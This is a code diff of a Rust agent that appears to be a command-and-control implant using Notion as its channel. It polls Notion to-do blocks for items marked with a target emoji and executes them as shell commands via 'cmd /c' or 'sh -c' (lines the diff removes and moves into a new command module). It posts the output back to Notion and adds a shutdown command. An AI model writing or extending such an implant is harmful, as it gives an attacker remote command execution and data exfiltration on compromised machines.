@@ -2,11 +2,9 @@ extern crate reqwest;
 extern crate tokio;
 extern crate serde_json;
 
-use std::process::Command;
 use std::{thread, time};
 use std::env::{args};
-
-use serde_json::{json};
+use std::process::exit;
 
 use reqwest::{Client};
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
@@ -21,7 +19,8 @@ use config::{
 mod notion;
 use notion::{get_blocks, complete_command, create_page, send_result};
 
-
+mod command;
+use command::{NotionCommand, CommandType};
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -89,29 +88,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             match block["to_do"]["text"][0]["text"]["content"].as_str() {
                 Some(s) => {
                     if s.contains("🎯") {
-                        let output = if cfg!(target_os = "windows") {
-                            Command::new("cmd")
-                                .args(["/c", s.replace("🎯", "").as_str()])
-                                .output()
-                                .expect("failed to execute process")
-                        } else {
-                            Command::new("sh")
-                                .arg("-c")
-                                .arg(s.replace("🎯", ""))
-                                .output()
-                                .expect("failed to execute process")
-                        };
-                        
+                        let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
+                        let output = notion_command.handle().await?;
                         let command_block_id = block["id"].as_str().unwrap();
-                        let output_string: String;
                         complete_command(&client, block.to_owned()).await;
-                        if output.stderr.len() > 0 {
-                            output_string = String::from_utf8(output.stderr).unwrap();
-                        } else {
-                            output_string = String::from_utf8(output.stdout).unwrap();
+                        send_result(&client, command_block_id, output).await;
+                        // Check for any final work based on command type,
+                        // Like shutting down the agent
+                        match notion_command.commmand_type {
+                            CommandType::Shutdown => {exit(0);},
+                            _ => {}
                         }
-                        send_result(&client, command_block_id, output_string).await;
-                        
                     };
 
                 },
@@ -122,6 +109,4 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         thread::sleep(sleep_time);
         println!("ZZZZ");
     }
-
-    Ok(())
 }
